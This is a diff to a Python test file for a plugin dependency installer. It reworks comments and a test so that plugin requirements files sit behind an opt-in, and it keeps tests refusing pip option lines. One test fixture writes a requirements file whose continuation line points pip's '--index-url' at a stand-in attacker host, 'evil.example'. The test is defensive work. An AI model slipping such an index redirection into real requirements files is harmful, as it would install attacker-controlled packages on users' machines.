@@ -616,12 +616,12 @@ class TestExecutorRefusesUnsatisfiedPlugins:
 # 10. The OTHER path into pip: a plugin-shipped requirements file
 #
 # `requirements.txt` / `requirements.post-install.txt` have driven
-# `pip install -r` since long before this feature, and that is deliberately
-# NOT behind the opt-in - gating it would break every existing plugin that
-# ships one. What must not survive is the full pip grammar inside that file:
-# an `--index-url` line in a plugin's requirements file redirects pip at a
-# host the operator never configured, which is exactly the power
-# validate_requirement refuses to take from a plugin's info.json.
+# `pip install -r` since long before this feature. Issue #88 put that path
+# behind the same opt-in (see test_plugin_requirements_file_gate.py); what
+# these tests cover is the grammar inside the file, which is refused whether
+# the opt-in is on or off: an `--index-url` line in a plugin's requirements
+# file redirects pip at a host the operator never configured, which is
+# exactly the power validate_requirement refuses to take from info.json.
 #
 # The documented boundary is therefore "pip is only ever given package names
 # from the configured index", and these tests are what makes that sentence
@@ -675,10 +675,12 @@ class TestRequirementsFileBoundary:
         path = self._write(plugin_dir, 'requests \\\n    --index-url https://evil.example/simple\n')
         assert [r[0] for r in plugin_dependencies.scan_requirements_file(path)] == [2]
 
-    def test_installing_a_plain_requirements_file_still_runs_pip(self, tmp_path, deny_installs):
+    def test_installing_a_plain_requirements_file_runs_pip_when_permitted(self, tmp_path, allow_installs):
         """
-        The opt-in does not gate this path, and must not start gating it:
-        existing plugins depend on it.
+        With the opt-in ON, a plain requirements file installs exactly as it
+        always did - the grammar check must not be in the way of the lines
+        real plugins ship. (With it OFF the install is refused; that is
+        issue #88 and lives in test_plugin_requirements_file_gate.py.)
         """
         plugins_path = str(tmp_path / 'plugins')
         path = _plugin_on_disk(plugins_path, defer_dependency_install=True)
